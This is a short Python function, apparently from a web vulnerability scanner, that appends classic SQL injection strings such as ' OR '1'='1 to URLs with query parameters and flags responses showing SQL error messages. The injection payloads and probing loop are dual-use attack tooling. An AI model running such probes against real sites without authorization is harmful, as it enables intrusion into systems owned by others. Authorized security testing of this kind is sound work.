import requests
import re

def test_sqli(urls):
    payloads = ["' OR '1'='1", '" OR "1"="1', "';--"]
    found = []

    for url in urls:
        if "?" not in url:
            continue
        for payload in payloads:
            test_url = url + payload
            try:
                res = requests.get(test_url)
                if re.search("sql syntax|mysql|error in your SQL", res.text, re.I):
                    found.append({"url": url, "payload": payload})
                    break
            except:
                continue

    return found
